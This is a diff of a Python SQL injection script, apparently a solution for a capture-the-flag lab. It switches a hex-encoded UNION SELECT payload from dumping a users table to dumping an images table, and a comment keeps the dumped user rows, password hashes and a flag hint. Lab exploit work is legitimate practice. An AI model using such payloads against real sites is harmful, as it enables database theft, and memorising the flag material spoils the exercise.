@@ -90,19 +90,14 @@ dquote = to_hex('"')
 query = (
         "1 UNION SELECT NULL, GROUP_CONCAT("
         + to_hex("(") + ","
-        + to_hex('"user_id: ') + ",user_id," + dquote + ","
-        + to_hex(',"first_name: ') + ",first_name," + dquote + ","
-        + to_hex(',"last_name: ') + ",last_name," + dquote + ","
-        + to_hex(',"town: ') + ",town," + dquote + ","
-        + to_hex(',"country: ') + ",country," + dquote + ","
-        + to_hex(',"planet: ') + ",planet," + dquote + ","
-        + to_hex(',"Commentaire: ') + ",Commentaire," + dquote + ","
-        + to_hex(',"countersign: ') + ",countersign," + dquote + ","
+        + to_hex('"id: ') + ",id," + dquote + ","
+        + to_hex(',"url: ') + ",url," + dquote + ","
+        + to_hex(',"title: ') + ",title," + dquote + ","
+        + to_hex(',"comment: ') + ",comment," + dquote + ","
         + to_hex(")")
-        + ") FROM Member_Sql_Injection.users"
+        + ") FROM Member_images.list_images"
 )
 
-# a list of columns indexes to show. 0 - first column, 1 - second column. These are the only options for now.
 SHOW_N_COLUMNS = [0, 1]
 
 # -----------------------------------------------------------------------------------------------------------------------
@@ -129,6 +124,7 @@ else:
     print("No extra table found")
     print(content.prettify())
     exit(1)
+# print(content.prettify())
 
 
 # all results
@@ -166,11 +162,6 @@ else:
     for i, item in enumerate(formatted_results):
         for j in SHOW_N_COLUMNS:
             print(f"{item[j]}")
-
-
-
-
-print("MANUAL CONVERSIONS + FINAL FLAG RETRIEVAL:")
 
 # result: ("user_id: 1","first_name: one","last_name: me","town: Paris ","country: France","planet: EARTH","Commentaire: Je pense, donc je suis","countersign: 2b3366bcfd44f540e630d4dc2b9b06d9"),("user_id: 2","first_name: two","last_name: me","town: Helsinki","country: Finlande","planet: Earth","Commentaire: Aamu on iltaa viisaampi.","countersign: 60e9032c586fb422e2c16dee6286cf10"),("user_id: 3","first_name: three","last_name: me","town: Dublin","country: Irlande","planet: Earth","Commentaire: Dublin is a city of stories and secrets.","countersign: e083b24a01c483437bcf4a9eea7c1b4d"),("user_id: 5","first_name: Flag","last_name: GetThe","town: 42","country: 42","planet: 42","Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !","countersign: 5ff9d0165b4f92b14994e5c685cdce28")
 query_result = [
